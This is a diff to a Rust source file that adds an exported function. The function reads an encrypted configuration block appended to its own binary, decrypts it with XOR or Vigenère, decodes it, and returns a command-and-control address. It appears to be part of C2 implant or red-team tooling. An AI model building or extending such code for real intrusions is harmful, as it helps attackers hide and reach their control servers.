@@ -185,6 +185,58 @@ pub extern "C" fn read_cfg(raw_key: *const std::ffi::c_char) -> *const std::ffi:
 }
 
 #[no_mangle]
+/// function designed to read the configuration bytes and
+/// return the C2 address. this will read the data from the
+/// end of the binary, decrypt it based on the encryption type
+/// passed in by the user, Base64 decode, JSON decode it, then
+/// grab the address and port from the Configuration struct that
+/// resulted from the JSON decoding.
+pub extern "C" fn read_cfg_with_encryption(
+    raw_key: *const std::ffi::c_char,
+    enc_type: std::ffi::c_int,
+) -> *const std::ffi::c_char {
+    // if null is passed in as the key, use q as the default;
+    // otherwise use the char* key passed in.
+    let key: &[u8] = convert_key_from_c(&raw_key);
+
+    // attempt to convert the user input into a rust i32 var.
+    //
+    // if this fails, NULL will be returned.
+    let enc_type_i32: i32 = match enc_type.try_into() {
+        Ok(int_val) => int_val,
+        Err(_) => return std::ptr::null(),
+    };
+
+    // create the decryptor based on the user's input. this will compare
+    // the int with the enum to determine what kind of decryptor to create.
+    //
+    // if an invalid int is passed in, or an error occurs, NULL will be returned.
+    let read_result: CfgResult;
+    if enc_type_i32 == cfgparser_encryption::EncryptionType::Xor as i32 {
+        let decryptor: cfgparser_encryption::xor::engine::XORCipher =
+            cfgparser_encryption::xor::engine::XORCipher::new(key.to_vec());
+        read_result = read_self(decryptor);
+    } else if enc_type_i32 == cfgparser_encryption::EncryptionType::Viginere as i32 {
+        let decryptor: cfgparser_encryption::viginere::engine::ViginereCipher =
+            match cfgparser_encryption::viginere::engine::ViginereCipher::new(key.to_vec()) {
+                Ok(vc) => vc,
+                Err(_) => return std::ptr::null(),
+            };
+        read_result = read_self(decryptor);
+    } else {
+        read_result = Err("invalid encryption type".into());
+    }
+
+    // read the Configuration from the current binary.
+    let configuration: models::core::Configuration = match read_result {
+        Ok(result) => result,
+        Err(_) => return std::ptr::null(),
+    };
+
+    format_address_c(configuration)
+}
+
+#[no_mangle]
 /// function designed to take in a filename and key, extract configuration
 /// information from the target and return a `<host>:<port>` string.
 ///
